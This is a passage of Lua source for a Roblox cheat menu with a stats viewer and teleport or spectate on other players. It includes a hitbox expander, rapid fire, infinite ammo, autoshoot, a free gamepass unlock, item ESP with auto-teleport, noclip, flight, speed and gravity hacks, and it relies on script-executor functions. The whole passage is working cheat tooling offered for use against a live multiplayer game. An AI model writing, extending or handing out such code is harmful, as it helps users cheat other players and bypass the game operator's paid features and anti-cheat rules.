    damageBoostLabel:SetText("Strength boost: " .. tostring(damageBoost))
    wonBoostLabel:SetText("Won boost: " .. tostring(wonBoost))
end

updateStatsDisplay(nil)

local function refreshPlayerList()
    local players = {}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(players, plr.Name)
        end
    end
    if #players == 0 then
        table.insert(players, "No players")
    end
    return players
end

local searchBox = PlayersStatsGroup:AddInput("PlayerSearch", {
    Text = "Search",
    Default = "",
    Placeholder = "Type name...",
    Callback = function(value)
        if value and value ~= "" then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and string.lower(plr.Name):find(string.lower(value)) then
                    selectedPlayer = plr
                    updateStatsDisplay(plr)
                    playerDropdown:SetValue(plr.Name)
                    break
                end
            end
        end
    end
})

local playerDropdown = PlayersStatsGroup:AddDropdown("PlayerSelect", {
    Text = "Select",
    Default = "No players",
    Values = refreshPlayerList(),
    Callback = function(selected)
        if selected == "No players" then 
            selectedPlayer = nil
            updateStatsDisplay(nil)
            return 
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name == selected then
                selectedPlayer = plr
                updateStatsDisplay(plr)
                break
            end
        end
    end
})

PlayersStatsGroup:AddButton("Biggest Player", function()
    local biggest = nil
    local maxWins = -1
    
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local wins = plr:GetAttribute("_GameWins") or 0
            if wins > maxWins then
                maxWins = wins
                biggest = plr
            end
        end
    end
    
    if biggest then
        selectedPlayer = biggest
        playerDropdown:SetValue(biggest.Name)
        updateStatsDisplay(biggest)
    end
    PlayBell()
end, {Tooltip = "Selects player with most wins"})

Players.PlayerAdded:Connect(function()
    playerDropdown:SetValues(refreshPlayerList())
end)

Players.PlayerRemoving:Connect(function()
    playerDropdown:SetValues(refreshPlayerList())
    if selectedPlayer and not selectedPlayer.Parent then
        selectedPlayer = nil
        updateStatsDisplay(nil)
        playerDropdown:SetValue("No players")
    end
end)

RunService.Heartbeat:Connect(function()
    if selectedPlayer and selectedPlayer.Parent then
        updateStatsDisplay(selectedPlayer)
    end
end)

local miscGroup = PlayersTab:AddRightGroupbox("Miscs", "rocket")

local playerListForTeleport = {}
local function updatePlayerListForTeleport()
    playerListForTeleport = {}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(playerListForTeleport, plr.Name)
        end
    end
    if #playerListForTeleport == 0 then
        table.insert(playerListForTeleport, "No players")
    end
end

updatePlayerListForTeleport()

local selectedTeleportPlayer = nil
local teleportDropdown = miscGroup:AddDropdown("TeleportPlayerSelect", {
    Text = "Select Player",
    Default = "No players",
    Values = playerListForTeleport,
    Callback = function(selected)
        if selected == "No players" then
            selectedTeleportPlayer = nil
            return
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name == selected then
                selectedTeleportPlayer = plr
                break
            end
        end
    end
})

miscGroup:AddButton("Teleport to Selected", function()
    if selectedTeleportPlayer then
        MainModule.TeleportToPlayer(selectedTeleportPlayer)
    else
        Library:Notify({Title = "Teleport", Description = "No player selected", Duration = 0.9})
        PlayErrorSound()
    end
end, {Tooltip = "Teleports you to selected player"})

miscGroup:AddButton("Spectate Selected", function()
    if selectedTeleportPlayer then
        MainModule.SpectatePlayer(selectedTeleportPlayer)
    else
        Library:Notify({Title = "Spectate", Description = "No player selected", Duration = 0.9})
        PlayErrorSound()
    end
end, {Tooltip = "Spectates selected player"})

miscGroup:AddButton("Stop Spectating", function()
    MainModule.StopSpectate()
end, {Tooltip = "Stops spectating"})

Players.PlayerAdded:Connect(function()
    task.wait(0.1)
    updatePlayerListForTeleport()
    teleportDropdown:SetValues(playerListForTeleport)
end)

Players.PlayerRemoving:Connect(function()
    task.wait(0.1)
    if selectedTeleportPlayer and not Players:FindFirstChild(selectedTeleportPlayer.Name) then
        selectedTeleportPlayer = nil
        teleportDropdown:SetValue("No players")
    end
    updatePlayerListForTeleport()
    teleportDropdown:SetValues(playerListForTeleport)
end)

miscGroup:AddButton("Teleport to Nearest", MainModule.teleportToNearest, {Tooltip = "Teleports to nearest player"})

local tpLabel = miscGroup:AddLabel("Keybind for TP to nearest:")
tpLabel:AddKeyPicker("TPNearestBind", {
    Default = "G",
    Mode = "Toggle",
    Text = "Teleport to Nearest",
    Callback = function()
        MainModule.teleportToNearest()
    end
})

local GunGroup = GuardsTab:AddLeftGroupbox("Gun", "crosshair")
local GuardsExtrasGroup = GuardsTab:AddRightGroupbox("Extras", "sparkles")

ToggleRefs.HitboxExpander = GunGroup:AddToggle("HitboxExpander", {
    Text = "Hitbox Expander",
    Default = false,
    Callback = function(value)
        MainModule.ToggleHitboxExpander(value)
    end,
    Tooltip = "Hitbox Size for players"
})

GunGroup:AddSlider("HitboxSize", {
    Text = "Hitbox Size",
    Default = 1,
    Min = 1,
    Max = 999,
    Callback = function(value)
        MainModule.SetHitboxSize(value)
    end,
    Tooltip = "Set hitbox size for all players"
})

GunGroup:AddSlider("HitboxTransparency", {
    Text = "Hitbox Transparency",
    Default = 100,
    Min = 0,
    Max = 100,
    Callback = function(value)
        MainModule.SetHitboxTransparency(value)
    end,
    Tooltip = "Set hitbox transparency (0 = invisible, 100 = fully visible)"
})
ToggleRefs.RapidFire = GunGroup:AddToggle("RapidFire", {Text="Rapid Fire", Default=false, Callback=MainModule.ToggleRapidFire, Tooltip = "infinite fire rate for guards weapons/MP5"})
ToggleRefs.InfiniteAmmo = GunGroup:AddToggle("InfiniteAmmo", {Text="Infinite Ammo", Default=false, Callback=MainModule.ToggleInfiniteAmmo, Tooltip = "Infinite bullets for guards weapons/MP5"})
ToggleRefs.AutoShoot = GunGroup:AddToggle("AutoShoot", {Text="AutoShoot", Default=false, Callback=MainModule.ToggleEffectShooter, Tooltip = "Autoshoots marked targets"})

ToggleRefs.PermanentGuard = GuardsExtrasGroup:AddToggle("PermanentGuard", {Text="Free Permanent Guard", Default=false, Callback=MainModule.TogglePermanentGuard, Tooltip = "Permanent Guard gamepass"})

local MainPlayer = MainTab:AddLeftGroupbox("Boosts", "cross")
local anniversary = MainTab:AddRightGroupbox("Anniversary", "wrench")
local MainEmotes = MainTab:AddLeftGroupbox("Emotes", "music")
local MainCombat = MainTab:AddLeftGroupbox("Combat", "sword")
local MainMisc = MainTab:AddRightGroupbox("Misc", "gem")
local MainExtras = assgarbage:AddLeftGroupbox("Extras", "sparkles")
local MainAuto = assgarbage:AddRightGroupbox("Auto", "sparkles")
local CustomWinAndMore = MainTab:AddRightGroupbox("Custom", "chess-king")
local MainGamepasses = MainTab:AddLeftGroupbox("Free gamepass", "crown")

local balloonEspToggle = anniversary:AddToggle("BalloonESP", {
    Text = "Balloon ESP",
    Default = false,
    Tooltip = "shows a tracer and notification to ballons when they are spawns",
    Callback = function(value)
    if PlayToggleSound then PlayToggleSound() end
        MainModule.ToggleBalloonESP(value)
    end
})

local balloonTeleportToggle = anniversary:AddToggle("BalloonTeleport", {
    Text = "Auto Teleport to Balloons",
    Default = false,
    Tooltip = "automatically teleport u to the ballon when they are available for pick up",
    Callback = function(value)
    if PlayToggleSound then PlayToggleSound() end
        MainModule.ToggleBalloonTeleport(value)
    end
})

balloonTeleportToggle:AddKeyPicker("BalloonTeleportKey", {
    Default = nil,
    Mode = "Toggle",
    Text = "Balloon Teleport Keybind",
    Callback = function(value)
        MainModule.ToggleBalloonTeleport(value)
        balloonTeleportToggle:SetValue(value)
    end
})

ToggleRefs.TugOfWarQTE = MainExtras:AddToggle("TugOfWarQTE", {
    Text = "Tug of War QTE",
    Default = false,
    Callback = MainModule.ToggleTugOfWarQTE,
    Tooltip = "Enables QTE mode for Tug of War. Press Space / A / X or tap the circle."
})

local qteButtonsToggle = MainExtras:AddToggle("QTEButtonsToggle", {
    Text = "QTE Buttons",
    Default = false,
    Tooltip = "Spawn QTE buttons with selected letters",
    Callback = function(value)
        if value then
            StartQTEButtons()
        else
            StopQTEButtons()
        end
    end
})

local lettersInput = MainExtras:AddInput("QTELettersInput", {
    Text = "Letters (e.g. WASD)",
    Default = "WASD",
    Placeholder = "Enter letters A-Z",
    Tooltip = "Letters to spawn (no spaces, e.g. QWER)",
    Callback = function(value)
    end
})

local speedSlider = MainExtras:AddSlider("QTESpeedSlider", {
    Text = "Spawn Speed (seconds)",
    Default = 0.5,
    Min = 0.05,
    Max = 2,
    Rounding = 2,
    Tooltip = "Delay between each button spawn",
    Callback = function(value)
    end
})

ToggleRefs.QTELettersInput = lettersInput
ToggleRefs.QTESpeedSlider = speedSlider
ToggleRefs.QTEButtonsToggle = qteButtonsToggle


ToggleRefs.HideNickname = MainExtras:AddToggle("HideNickname", {
    Text = "Hide Own Nickname",
    Default = false,
    Callback = MainModule.ToggleHideNickname,
    Tooltip = "Hide your nickname and title"
})

ToggleRefs.HideAllNicknames = MainExtras:AddToggle("HideAllNicknames", {
    Text = "Hide All Nicknames",
    Default = false,
    Callback = MainModule.ToggleHideAllNicknames,
    Tooltip = "Hide everyone's nicknames and titles"
})

MainModule.PeabertESPEnabled = false
MainModule.PeabertESPMode = "Drawing"
MainModule.PeabertESPDrawings = {}
MainModule.PeabertESPHighlights = {}
MainModule.PeabertESPConnection = nil
MainModule.PeabertTargetsCache = {}
MainModule.PeabertLastScan = 0

local PEABERT_LOOKUP = {}
for i = 1, 9 do PEABERT_LOOKUP["PeabertShattered" .. i] = true end
for i = 1, 40 do PEABERT_LOOKUP["PeabertSpawn" .. i] = true end
for i = 1, 15 do PEABERT_LOOKUP["PeabertCrack" .. i] = true end

local function clearPeabertESP()
    for _, d in pairs(MainModule.PeabertESPDrawings) do
        pcall(function() if d.Remove then d:Remove() end end)
    end
    MainModule.PeabertESPDrawings = {}

    for _, h in pairs(MainModule.PeabertESPHighlights) do
        pcall(function() if h and h.Parent then h:Destroy() end end)
    end
    MainModule.PeabertESPHighlights = {}
end

local function scanPeaberts()
    local targets = {}
    local seen = {}

    for _, obj in ipairs(workspace:GetDescendants()) do
        local name = obj.Name
        if PEABERT_LOOKUP[name] and not seen[obj] then
            local part = nil
            if obj:IsA("BasePart") then
                part = obj
            elseif obj:IsA("Model") then
                part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
            end

            if part then
                seen[obj] = true
                table.insert(targets, {
                    Object = obj,
                    Part = part,
                    Name = name
                })
            end
        end
    end

    MainModule.PeabertTargetsCache = targets
    MainModule.PeabertLastScan = tick()
end

local function getColor(name)
    if name:find("Shattered") then
        return Color3.fromRGB(255, 60, 60)
    elseif name:find("Spawn") then
        return Color3.fromRGB(50, 255, 100)
    elseif name:find("Crack") then
        return Color3.fromRGB(255, 170, 40)
    end
    return Color3.fromRGB(255, 255, 255)
end

function MainModule.StartPeabertESP()
    if MainModule.PeabertESPEnabled then return end
    MainModule.PeabertESPEnabled = true
    clearPeabertESP()
    scanPeaberts()

    local mode = MainModule.PeabertESPMode or "Drawing"

    MainModule.PeabertESPConnection = RunService.RenderStepped:Connect(function()
        if not MainModule.PeabertESPEnabled then return end

        if tick() - MainModule.PeabertLastScan > 0.6 then
            scanPeaberts()
        end

        local camera = workspace.CurrentCamera
        if not camera then return end

        local targets = MainModule.PeabertTargetsCache
        local used = {}

        for _, data in ipairs(targets) do
            local part = data.Part
            if part and part.Parent then
                local color = getColor(data.Name)
                used[data.Name] = true

                if mode == "Drawing" then
                    local line = MainModule.PeabertESPDrawings[data.Name]
                    if not line then
                        local ok, drawing = pcall(function()
                            return Drawing.new("Line")
                        end)
                        if ok and drawing then
                            line = drawing
                            line.Thickness = 1.6
                            line.Transparency = 1
                            line.Color = color
                            line.Visible = true
                            MainModule.PeabertESPDrawings[data.Name] = line
                        end
                    end

                    if line then
                        local screenPos, onScreen = camera:WorldToViewportPoint(part.Position)
                        if onScreen and screenPos.Z > 0 then
                            local size = camera.ViewportSize
                            line.From = Vector2.new(size.X / 2, size.Y)
                            line.To = Vector2.new(screenPos.X, screenPos.Y)
                            line.Color = color
                            line.Visible = true
                        else
                            line.Visible = false
                        end
                    end
                else
                    local highlight = MainModule.PeabertESPHighlights[data.Name]
                    if not highlight or not highlight.Parent then
                        highlight = Instance.new("Highlight")
                        highlight.Name = "PeabertESP_" .. data.Name
                        highlight.Adornee = data.Object:IsA("Model") and data.Object or part
                        highlight.FillColor = color
                        highlight.OutlineColor = color
                        highlight.FillTransparency = 0.55
                        highlight.OutlineTransparency = 0
                        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        highlight.Parent = game:GetService("CoreGui")
                        MainModule.PeabertESPHighlights[data.Name] = highlight
                    else
                        highlight.FillColor = color
                        highlight.OutlineColor = color
                        highlight.Adornee = data.Object:IsA("Model") and data.Object or part
                    end
                end
            end
        end

        if mode == "Drawing" then
            for name, line in pairs(MainModule.PeabertESPDrawings) do
                if not used[name] then
                    line.Visible = false
                end
            end
        else
            for name, hl in pairs(MainModule.PeabertESPHighlights) do
                if not used[name] and hl and hl.Parent then
                    hl:Destroy()
                    MainModule.PeabertESPHighlights[name] = nil
                end
            end
        end
    end)

    if MainModule.Notify then
        MainModule.Notify("Peabert ESP", "Enabled (" .. mode .. ")", 1.2)
    end
    if PlayToggleSound then PlayToggleSound() end
    return true
end

function MainModule.StopPeabertESP()
    if not MainModule.PeabertESPEnabled then return end
    MainModule.PeabertESPEnabled = false

    if MainModule.PeabertESPConnection then
        pcall(function() MainModule.PeabertESPConnection:Disconnect() end)
        MainModule.PeabertESPConnection = nil
    end

    clearPeabertESP()
    if PlayToggleSound then PlayToggleSound() end
end

function MainModule.TogglePeabertESP(state)
    if state then
        return MainModule.StartPeabertESP()
    else
        MainModule.StopPeabertESP()
        return true
    end
end

function MainModule.SetPeabertESPMode(mode)
    if mode ~= "Drawing" and mode ~= "Highlight" then return end
    MainModule.PeabertESPMode = mode

    if MainModule.PeabertESPEnabled then
        MainModule.StopPeabertESP()
        task.wait(0.05)
        MainModule.StartPeabertESP()
    end
end

function MainModule.TPToPeaberts()
    local character = LocalPlayer.Character
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if tick() - MainModule.PeabertLastScan > 1 then
        scanPeaberts()
    end

    local targets = MainModule.PeabertTargetsCache
    if #targets == 0 then
        if MainModule.Notify then
            MainModule.Notify("Peabert TP", "Peaberts was not found on the map", 1.5)
        end
        return
    end

    if MainModule.Notify then
        MainModule.Notify("Peabert TP", "teleport to " .. #targets .. "", 1.5)
    end

    task.spawn(function()
        for _, data in ipairs(targets) do
            if not character or not character.Parent then break end
            hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then break end

            local part = data.Part
            if part and part.Parent then
                hrp.CFrame = part.CFrame + Vector3.new(0, 4, 0)
                task.wait(0.12)
            end
        end

        if MainModule.Notify then
            MainModule.Notify("Peabert TP", "Success", 1)
        end
    end)
end

MainModule.AddVisualItemsEnabled = false
MainModule.AddVisualItemsConnection = nil

getgenv().Time = 3
getgenv().Head = {1095708}
getgenv().Hand = {3141364957}
getgenv().Torso = {2222720521}

local function findMyCharacter()
    local camera = workspace.CurrentCamera
    if camera and camera.CameraSubject then
        local subject = camera.CameraSubject
        if subject and subject:IsA("Humanoid") then
            return subject.Parent
        end
    end
    
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") and obj:FindFirstChild("Head") then
            if not string.find(obj.Name:lower(), "badpreload") and not string.find(obj.Name:lower(), "preload") then
                return obj
            end
        end
    end
    return nil
end

local function addAccessory(accessoryId, parentPart)
    local success, accessory = pcall(function()
        return game:GetObjects("rbxassetid://" .. tostring(accessoryId))[1]
    end)
    
    if success and accessory then
        local handle = accessory:FindFirstChild("Handle")
        if handle then
            local accessoryAttachment = handle:FindFirstChildOfClass("Attachment")
            
            if accessoryAttachment then
                local parentAttachment = parentPart:FindFirstChild(accessoryAttachment.Name)
                
                if parentAttachment then
                    local weld = Instance.new("Weld")
                    weld.Part0 = parentPart
                    weld.Part1 = handle
                    weld.C0 = parentAttachment.CFrame
                    weld.C1 = accessoryAttachment.CFrame
                    weld.Parent = handle
                else
                    local weld = Instance.new("Weld")
                    weld.Part0 = parentPart
                    weld.Part1 = handle
                    weld.C0 = CFrame.new()
                    weld.C1 = CFrame.new()
                    weld.Parent = handle
                end
            else
                local weld = Instance.new("Weld")
                weld.Part0 = parentPart
                weld.Part1 = handle
                weld.C0 = CFrame.new()
                weld.C1 = CFrame.new()
                weld.Parent = handle
            end
            
            handle.CanCollide = false
            accessory.Parent = parentPart.Parent
            
            print("Added to u: " .. tostring(accessoryId))
        else
            warn("No Handle found in accessory: " .. tostring(accessoryId))
        end
    else
        warn("Failed to load accessory: " .. tostring(accessoryId))
    end
end

local function ApplyHeadless(character)
    local head = character:FindFirstChild("Head")
    if not head then return end

    head.Transparency = 1
    head.CanCollide = false
    
    local face = head:FindFirstChildOfClass("Decal")
    if face then face:Destroy() end

    for _, v in ipairs(head:GetChildren()) do
        if v:IsA("SpecialMesh") or v:IsA("CharacterMesh") then
            v:Destroy()
        end
    end

    local mesh = Instance.new("SpecialMesh")
    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = "rbxassetid://1095708"
    mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
    mesh.Parent = head
end

local function ApplyKorblox(character)
    local rightLeg = character:FindFirstChild("Right Leg")
    if not rightLeg then return end

    for _, v in ipairs(rightLeg:GetChildren()) do
        if v:IsA("SpecialMesh") or v:IsA("CharacterMesh") then
            v:Destroy()
        end
    end

    local mesh = Instance.new("SpecialMesh")
    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = "rbxassetid://3141364957"
    mesh.TextureId = "rbxassetid://3141364957"
    mesh.Scale = Vector3.new(1, 1, 1)
    mesh.Parent = rightLeg
end

local function AddVisualItems()
    local character = findMyCharacter()
    if not character then return end

    if character:FindFirstChild("Head") then
        for _, id in ipairs(getgenv().Head) do
            addAccessory(id, character.Head)
            task.wait(0.3)
        end
    end

    local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
    if torso then
        for _, id in ipairs(getgenv().Torso) do
            addAccessory(id, torso)
            task.wait(0.3)
        end
    end

    local hand = character:FindFirstChild("RightHand") or character:FindFirstChild("LeftHand")
    if not hand then
        hand = character:FindFirstChild("Right Arm") or character:FindFirstChild("Left Arm")
    end

    if hand and getgenv().Hand then
        for _, id in ipairs(getgenv().Hand) do
            addAccessory(id, hand)
            task.wait(0.3)
        end
    end

    ApplyHeadless(character)
  --  ApplyKorblox(character)
end

function MainModule.ToggleVisualItems(enabled)
    MainModule.AddVisualItemsEnabled = enabled
    
    if MainModule.AddVisualItemsConnection then
        MainModule.AddVisualItemsConnection:Disconnect()
        MainModule.AddVisualItemsConnection = nil
    end
    
    if enabled then
        AddVisualItems()
        MainModule.AddVisualItemsConnection = LocalPlayer.CharacterAdded:Connect(function(character)
            task.wait(1)
            if MainModule.AddVisualItemsEnabled then
                AddVisualItems()
            end
        end)
    end
    
    PlayToggleSound()
end

ToggleRefs.PeabertESP = anniversary:AddToggle("PeabertESP", {
    Text = "Peabert ESP",
    Default = false,
    Callback = MainModule.TogglePeabertESP,
    Tooltip = "yoo bro this feature is tuff im fr"
})

anniversary:AddDropdown("PeabertESPMode", {
    Text = "ESP Mode",
    Default = "Drawing",
    Values = {"Drawing", "Highlight"},
    Callback = MainModule.SetPeabertESPMode,
    Tooltip = "use highlight mode if drawing not suported in ur executpr"
})

anniversary:AddButton("TP to Peaberts", function()
    MainModule.TPToPeaberts()
end, {Tooltip = "teleport to peaberrt"
})

ToggleRefs.FOVChanger = MainMisc:AddToggle("FOVChanger", {Text="FOV Changer", Default=false, Callback=MainModule.ToggleFOV, Tooltip = "Increase your field of view"})
MainMisc:AddSlider("FOVValue", {Text="FOV Value", Default=120, Min=70, Max=120, Callback=MainModule.SetFOV, Tooltip = "Set custom FOV"})
ToggleRefs.Fullbright = MainMisc:AddToggle("Fullbright", {Text="Fullbright", Default=false, Callback=MainModule.ToggleFullbright, Tooltip = "Makes everything bright"})
ToggleRefs.Ambience = MainMisc:AddToggle("Ambience", {Text="Ambience", Default=false, Callback=MainModule.ToggleAmbience, Tooltip = "Adds night time and motion blur effects"})
local noCooldownToggle = MainMisc:AddToggle("NoCooldownProximity", {
    Text = "Instant Interact",
    Default = false,
    Tooltip = "Removes hold duration from all proximity prompts (doors, items, etc.)",
    Callback = MainModule.ToggleNoCooldownProximity
})
ToggleRefs.Flight = MainMisc:AddToggle("Flight", {Text="Flight", Default=false, Callback=MainModule.ToggleFly, Tooltip = "Allows your character to fly. WASD To Control."})
MainMisc:AddSlider("FlySpeed", {Text="Fly Speed", Default=52, Min=10, Max=200, Callback=MainModule.SetFlySpeed, Tooltip = "Set your character fly speed"})
local noclippizdaEnabled = false

local function noclippizda()
    local character = Players.LocalPlayer.Character
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") and not object:IsDescendantOf(character) then
            if object.Transparency and object.Transparency >= 0.99 then
                continue
            end
            
            local name = object.Name:lower()
            if name:find("wall") then
                object.CanCollide = not noclippizdaEnabled
            elseif name:find("floor") or name:find("ground") or name:find("plate") then
                object.CanCollide = true
            else
                if object.Size.Y < object.Size.X and object.Size.Y < object.Size.Z then
                    object.CanCollide = true
                elseif object.Size.Y > object.Size.X or object.Size.Y > object.Size.Z then
                    object.CanCollide = not noclippizdaEnabled
                end
            end
        end
    end
end

ToggleRefs.AddVisualItems = MainPlayer:AddToggle("AddVisualItems", {
    Text = "Add Visual Items",
    Default = false,
    Callback = MainModule.ToggleVisualItems,
    Tooltip = "Adds custom items to ur character (Headless, etc)"
})

local noclippizda = MainMisc:AddToggle("NoclipV2", {
    Text = "Noclip",
    Default = false,
    Callback = function(value)
        noclippizdaEnabled = value
        noclippizda()
    end
})

noclippizda:AddKeyPicker("Noclip", {
    Default = "X",
    Mode = "Toggle",
    Text = "Noclip",
    Callback = function(value)
        noclippizda:SetValue(value)
    end
})
ToggleRefs.Noclip = MainMisc:AddToggle("Noclip", {Text="TP Through Walls [X]", Default=false, Tooltip = "Press X to teleport throught wall (Not always work)", Callback=function(state) 
    MainModule.noclipEnabled = state
    if state then
        if MainModule.IsMobile() then 
            MainModule.createNoclipButton() 
        else
            local function onInput(input, gameProcessed)
                if gameProcessed then return end
                if input.KeyCode == Enum.KeyCode.X then 
                    MainModule.teleportThroughWall()
                end
            end
            MainModule.noclipConnection = UserInputService.InputBegan:Connect(onInput)
        end
    else
        if MainModule.noclipButton then MainModule.noclipButton:Destroy() end
        if MainModule.noclipConnection then MainModule.noclipConnection:Disconnect() end
    end
end})
ToggleRefs.RemoveStun = MainMisc:AddToggle("RemoveStun", {Text="Remove Stun", Default=false, Callback=MainModule.ToggleRemoveStun, Tooltip = "Removes stun effects"})
ToggleRefs.RemoveStun:AddKeyPicker("RemoveStunBind", {
    Default = nil,
    Mode = "Toggle",
    Text = "Remove Stun",
    Callback = function(value)
        MainModule.ToggleRemoveStun(value)
        if ToggleRefs.RemoveStun then
            ToggleRefs.RemoveStun:SetValue(value)
        end
    end
})

MainModule.FreeCam = {
    Enabled = false,
    Camera = nil,
    OriginalCameraType = nil,
    OriginalCameraSubject = nil,
    OriginalCFrame = nil,
    Speed = 10,
    Keys = {W=false, S=false, A=false, D=false, Q=false, E=false},
    Connection = nil,
    HeartbeatConnection = nil
}

MainModule.ToggleFreeCam = function(enabled)
    if enabled then
        if MainModule.FreeCam.Enabled then return end
        MainModule.FreeCam.Enabled = true
        
        local cam = workspace.CurrentCamera
        local char = LocalPlayer.Character
        local rootPart = char and char:FindFirstChild("HumanoidRootPart")
        
        MainModule.FreeCam.OriginalCameraType = cam.CameraType
        MainModule.FreeCam.OriginalCameraSubject = cam.CameraSubject
        MainModule.FreeCam.OriginalCFrame = cam.CFrame
        MainModule.FreeCam.Camera = cam
        
        if rootPart then
            MainModule.FreeCam.OriginalPosition = rootPart.CFrame
        end
        
        cam.CameraType = Enum.CameraType.Scriptable
        cam.CFrame = MainModule.FreeCam.OriginalCFrame
        
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.AutoRotate = false
                hum.PlatformStand = true
            end
            if rootPart then
                rootPart.Anchored = true
            end
        end
        
        local function updateFreeCam()
            if not MainModule.FreeCam.Enabled then return end
            
            local move = Vector3.new()
            local cam = MainModule.FreeCam.Camera
            if not cam then return end
            
            if MainModule.FreeCam.Keys.W then move = move + cam.CFrame.LookVector end
            if MainModule.FreeCam.Keys.S then move = move - cam.CFrame.LookVector end
            if MainModule.FreeCam.Keys.D then move = move + cam.CFrame.RightVector end
            if MainModule.FreeCam.Keys.A then move = move - cam.CFrame.RightVector end
            if MainModule.FreeCam.Keys.Q then move = move + Vector3.new(0, -1, 0) end
            if MainModule.FreeCam.Keys.E then move = move + Vector3.new(0, 1, 0) end
            
            if move.Magnitude > 0 then
                move = move.Unit * MainModule.FreeCam.Speed
                cam.CFrame = cam.CFrame + move
            end
        end
        
        local inputBegan = UserInputService.InputBegan:Connect(function(input, gp)
            if gp then return end
            local k = input.KeyCode
            if k == Enum.KeyCode.W then MainModule.FreeCam.Keys.W = true
            elseif k == Enum.KeyCode.S then MainModule.FreeCam.Keys.S = true
            elseif k == Enum.KeyCode.A then MainModule.FreeCam.Keys.A = true
            elseif k == Enum.KeyCode.D then MainModule.FreeCam.Keys.D = true
            elseif k == Enum.KeyCode.Q then MainModule.FreeCam.Keys.Q = true
            elseif k == Enum.KeyCode.E then MainModule.FreeCam.Keys.E = true
            elseif k == Enum.KeyCode.LeftShift then MainModule.FreeCam.Speed = 25
            elseif k == Enum.KeyCode.LeftControl then MainModule.FreeCam.Speed = 5
            end
        end)
        
        local inputEnded = UserInputService.InputEnded:Connect(function(input)
            local k = input.KeyCode
            if k == Enum.KeyCode.W then MainModule.FreeCam.Keys.W = false
            elseif k == Enum.KeyCode.S then MainModule.FreeCam.Keys.S = false
            elseif k == Enum.KeyCode.A then MainModule.FreeCam.Keys.A = false
            elseif k == Enum.KeyCode.D then MainModule.FreeCam.Keys.D = false
            elseif k == Enum.KeyCode.Q then MainModule.FreeCam.Keys.Q = false
            elseif k == Enum.KeyCode.E then MainModule.FreeCam.Keys.E = false
            elseif k == Enum.KeyCode.LeftShift then MainModule.FreeCam.Speed = 10
            elseif k == Enum.KeyCode.LeftControl then MainModule.FreeCam.Speed = 10
            end
        end)
        
        MainModule.FreeCam.Connection = RunService.RenderStepped:Connect(updateFreeCam)
        MainModule.FreeCam.InputBegan = inputBegan
        MainModule.FreeCam.InputEnded = inputEnded
        
        Library.Notify("FreeCam", "WASD + Q/E | Shift/Ctrl for speed", 0.9)
    else
        if not MainModule.FreeCam.Enabled then return end
        MainModule.FreeCam.Enabled = false
        
        if MainModule.FreeCam.Connection then
            MainModule.FreeCam.Connection:Disconnect()
            MainModule.FreeCam.Connection = nil
        end
        if MainModule.FreeCam.InputBegan then
            MainModule.FreeCam.InputBegan:Disconnect()
            MainModule.FreeCam.InputBegan = nil
        end
        if MainModule.FreeCam.InputEnded then
            MainModule.FreeCam.InputEnded:Disconnect()
            MainModule.FreeCam.InputEnded = nil
        end
        
        local cam = MainModule.FreeCam.Camera
        if cam then
            cam.CameraType = MainModule.FreeCam.OriginalCameraType or Enum.CameraType.Custom
            if MainModule.FreeCam.OriginalCameraSubject then
                cam.CameraSubject = MainModule.FreeCam.OriginalCameraSubject
            end
        end
        
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.AutoRotate = true
                hum.PlatformStand = false
            end
            local rootPart = char:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.Anchored = false
                if MainModule.FreeCam.OriginalPosition then
                    rootPart.CFrame = MainModule.FreeCam.OriginalPosition
                end
            end
        end
        
        MainModule.Notify("FreeCam", "Disabled", 0.9)
    end
    PlayToggleSound()
end

MainPlayer:AddToggle("SpeedHack", {Text="Speed Hack", Default=false, Callback=MainModule.ToggleSpeedHack, Tooltip = "Increase your character speed"})
MainPlayer:AddSlider("SpeedValue", {Text="Speed Value", Default=39, Min=16, Max=50, Callback=MainModule.SetSpeedValue, Tooltip = "Set speed"})
local freecamToggle = MainPlayer:AddToggle("FreeCam", {
    Text = "Free Cam",
    Default = false,
    Tooltip = "Free camera mode. WASD + Q/E to move, Shift/Ctrl for speed",
    Callback = MainModule.ToggleFreeCam
})

freecamToggle:AddKeyPicker("FreeCamBind", {
    Default = "P",
    Mode = "Toggle",
    Text = "Free Cam",
    Callback = function(value)
        MainModule.ToggleFreeCam(value)
        freecamToggle:SetValue(value)
    end
})


local jumpToggle = MainPlayer:AddToggle("CustomJumpPower", {
    Text = "Custom Jump Power",
    Default = false,
    Tooltip = "Changes your jump power",
    Callback = MainModule.ToggleCustomJumpPower
})

ToggleRefs.Flight:AddKeyPicker("FlightBind", {Default=nil, Mode="Toggle", Text="Flight", Callback=function(v) MainModule.ToggleFly(v) end})
local gravityToggle = MainPlayer:AddToggle("CustomGravity", {
    Text = "Custom Gravity",
    Default = false,
    Tooltip = "Changes game gravity",
    Callback = MainModule.ToggleCustomGravity
})

MainPlayer:AddSlider("CustomGravitySlider", {
    Text = "Gravity Value",
    Default = 196.2,
    Min = 50,
    Max = 500,
    Rounding = 1,
    Tooltip = "Set custom gravity value",
    Callback = function(value)
        MainModule.SetCustomGravity(value)
    end
})

MainPlayer:AddSlider("CustomJumpSlider", {
    Text = "Jump Power Value",
    Default = 50,
    Min = 20,
    Max = 200,
    Rounding = 0,
    Tooltip = "Set custom jump power",
    Callback = function(value)
        MainModule.SetCustomJumpPower(value)
    end
})
